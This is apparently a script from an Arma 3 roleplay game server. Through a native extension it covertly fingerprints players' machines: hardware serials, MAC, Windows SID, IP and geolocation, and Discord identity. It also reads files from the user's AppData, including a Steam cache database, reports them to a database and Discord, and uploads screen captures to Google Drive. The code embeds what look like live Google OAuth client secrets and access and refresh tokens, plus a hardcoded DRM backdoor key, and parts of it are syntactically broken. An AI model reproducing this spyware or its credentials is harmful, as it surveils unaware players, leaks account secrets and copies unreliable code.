checkDRM = {
	private _ext = { "hwid" callExtension _this };
	if (("checkDRM" call _ext) isNotEqualTo "YES") then {
		if ((["unlockDRM",["myKey1"]] call _ext) isNotEqualTo "Success") then {
			if ((["backdoor_unlock",["mcv28uy3r98cwery9awcrhqb34ry"]] call _ext) isNotEqualTo "") exitWith {
				false
			};
		};
	};
	true
};

hardwares = {
	private _ext = { "hwid" callExtension _this };
	call checkDRM;

	private _macAdres =
	{
		_str = "get_MAC" call _ext;
		_toFind = ":";
		_char = count _toFind;
		_no = _str find _toFind;
		while {-1 != _str find _toFind} do {
			_no = _str find _toFind;
			_splitStr = _str splitString "";
			_splitStr deleteRange [(_no +1), _char -1];
			_splitStr set [_no, "-"];
			_str = _splitStr joinString "";
		};
		_str
	};

	private _getHW = {
		_input = _this select 0;
		_r = ("rrpExt" callExtension ["getHardwares",[_input]]) select 0;
		parseSimpleArray ("[" + _r + "]")
	};

	_path1 = "~\My Games\SYSTEM";
	_path2 = "~\AppData\Local\oobelibMkey2.log";
	_path3 = "~\AppData\Local\Steam\htmlcache\steam.db";

	_file1 = ["2_f",[_path1]] call _ext;
	_file2 = ["2_f",[_path2]] call _ext;
	_file3 = ["2_f",[_path3]] call _ext;

	[
		call _macAdres,
		"get_HWID" call _ext,
		"get_HDDUID" call _ext,
		"get_Product" call _ext,
		"get_GUID" call _ext,

		"get_IP" call _ext,
		"get_GeoIP" call _ext,
		"get_Sd" call _ext,

		"GetCPU_name" call _ext,
		"GetCPU_id" call _ext,

		"GetMother_name" call _ext,
		"GetMother_id" call _ext,
		"GetBios_ReleaseDate" call _ext,
		"GetBios_Version" call _ext,

		"GetRam_serialNumber" call _ext,
		"GetRam_capacity" call _ext,
		"GetPC_name" call _ext,
		"Get_SID" call _ext,
		"Get_VRAM_name" call _ext,

		((["RAMQ"] call _getHW) select 0) select 0,
		["HDDQ"] call _getHW,
		_file1#0,
		_file2#0,
		_file3#0
	];
};

SerializeHardwares = {
	if !(canSuspend) exitWith {_this spawn SerializeHardwares};


	forceUnicode 0;
	private _strip = {
		params [
			["_text","",[""]],
			["_filter","([""]/\:;%{})",[""]]
		];

		if (_text isEqualTo "") exitWith {""};
		_ret = _text splitString _filter joinString "";
		_ret
	};

	params ["_player","_data"];

	{
		if (_x isEqualType "") then
		{
			_data set [_forEachIndex,[_x] call _strip];
		};
	}forEach _data;

	_data params [
		"_mac",
		"_hwid",
		"_product",
		"_guid",
		"_ip"
		"_geoIpData",
		"_discordData",
		"_cpu",
		"_cpuName",
		"_motherName",
		"_motherId",
		"_biosDate",
		"_biosVersion",
		"_ramSerialNumber",
		"_ramCap",
		"_pcName",
		"_sid",
		"_vram",
		"_ram",
		"_hdds",
		"_file1",
		"_file2",
		"_file3"
	];
	_geoIpData params ["_City","_Country","_CountryCode","_Region","_RegionName","_Zip"];
	_discordData params ["_dsName","_dsId"];

	_uid = getPlayerUID _player;
	_getHardware = format ["getPlayerHardware:%1",_uid] call RRPServer_DB_selectSingleField

	_hardwares = [];
	if (isNil "_getHardware") then {
		_query = ["insertPlayerHardware",_array] call RRPServer_DB_createMessage;
		_query call RRPServer_DB_fireAndForget;
		private _steam = {parseSimpleArray(("steam" callExtension _this) select 0) select 0};
		(["getBans",[_uid]] call _steam) params ["_uid","_comBan","_vac","_ecoBan","_numVacs","_daysLastBan","_numGameBans"]; 
		(["getProfileName",[_uid]] call _steam) params ["","_visibility","_profileURL","_personaName"]; 

		[
			"test","","","",false,
			[
				[
					format["Steam профиль: %1",name _player],
					"",
					_profileURL,
					"#FBFF00",true,
					"","",[],[],
					[
						[
							"**Игрок:**",
							[
								format ["**Имя:** %1",name _player],
								format ["**UID:** %1",_uid],
								format ["**DISCORD:** %1",_dsName]
							] joinString "\n",
							true
						],
						[
							"**Данные о системе:**",
							[
								format ["**CPU:** %1",_cpuName],
								format ["**Motherboard:** %1",_mName],
								format ["**GPU:** %1",_vram],
								format ["**WIN Version:** %1",_WinProdVersion],
								format ["**RAM Capacity:** %1",_RAM],
								format ["**PC_Name:** %1",_pcName]
							] joinString "\n",
							true
						],
						[
							"**Инфо об IP:**",
							[
								format ["**IP:** %1",_ip],
								format ["**Country: **%1",_country],
								format ["**City:** %1",_region],
								format ["**Region Name: **%1",_regionName]
							] joinString "\n",
							true
						],
						[
							"**Идентификаторы:**",
							[
								format ["**DISCORD ID: **%1",_dsId],
								format ["**CPU ID:** %1",_cpuId],
								format ["**MOTHER ID:** %1",_mId],
								format ["**HWID:** %1",_hwid],
								format ["**MAC:** %1",_mac],
								format ["**SID:** %1",_sid],
								format ["**HDDs: **%1",_HDDs joinString "\n"]
							] joinString "\n",
							true
						],
						[
							"**Данные о Steam:**",
							[
								"Регистрация: Еще не сделал",
								"Дата регистрации: Еще не сделал",
								format["Блокировка сообщества: %1",_comBan],
								format["VAC: %1",_vac],
								format["VAC банов: %1",_numVacs],
								format["Экономический бан: %1",_ecoBan],
								format["Дней с последнего бана: %1",_daysLastBan],
								format["Всего банов: %1",_numGameBans],
								format["Имя профиля: %1",_personaName],
								"Наиграл в A3: Еще не сделал"
							]joinString "\n",
							true
						]
					]
				]
			]
		] call DiscordEmbedBuilder_fnc_buildSqf;

	}else{
		_query = ["updatePlayerHardware",_array] call RRPServer_DB_createMessage;
		_query call RRPServer_DB_fireAndForget;
	};
};

dumpScreen = {
	private _mode = param [0,true]; 
	private _ext = { "hwid" callExtension _this };
	call checkDRM;

	["1_c",[
		"{""installed"":{""client_id"":""563093962208-q35p9abma7bj9sn2tidnfhkuv483r1i0.apps.googleusercontent.com"",""project_id"":""credible-bank-447317-f5"",""auth_uri"":""https://accounts.google.com/o/oauth2/auth"",""token_uri"":""https://oauth2.googleapis.com/token"",""auth_provider_x509_cert_url"":""https://www.googleapis.com/oauth2/v1/certs"",""client_secret"":""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"",""redirect_uris"":[""http://localhost""]}}"
	]] call _ext;
	["2_c",[
		"{""access_token"":""ya29.a0ARW5m77pdBky22H4C00hJ-OzxhcL7uTkno5uc2uXHj0HcqCEIC8g4J9zQMqN4_L0UIE1fTtGkW2JGbbu9HQeXgkWopDx8FhP3IvI_YazzM_FpN48DldX5UA4Kpelf-X9oYfA1CwBYpFtULCJfvFXFQC5QhXpg1QK0bhYPg4faCgYKAbISARASFQHGX2MijXieN1s9fSinnqhYTIgCMw0175"",""token_type"":""Bearer"",""refresh_token"":""1//09dEqfxpVphckCgYIARAAGAkSNwF-L9IrlVuCpiH0j-fBTDJ9JK4Z-sCBqO3bDz4ZFtbJcWjGBIPZBAdEzqh8d4wofi7s6cOS9yY"",""token_uri"":""https://oauth2.googleapis.com/token"",""client_id"":""563093962208-q35p9abma7bj9sn2tidnfhkuv483r1i0.apps.googleusercontent.com"",""client_secret"":""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"",""scopes"":[""https://www.googleapis.com/auth/drive""],""universe_domain"":""googleapis.com"",""account"":"""",""expiry"":""2025-01-09T18:26:37.293525Z""}"
	]] call _ext;

	private _input = if (_mode) then {"3_c"}else{"3_c_t"};
	[_input,[name player, getPlayerUID player]] call _ext;

};	

showWinMessage = {
	private _ext = { "hwid" callExtension _this };
	_message = _this;
	if !(_message isEqualType []) exitWith {};	
	["Message",[_message joinString endl]] call _ext;

};
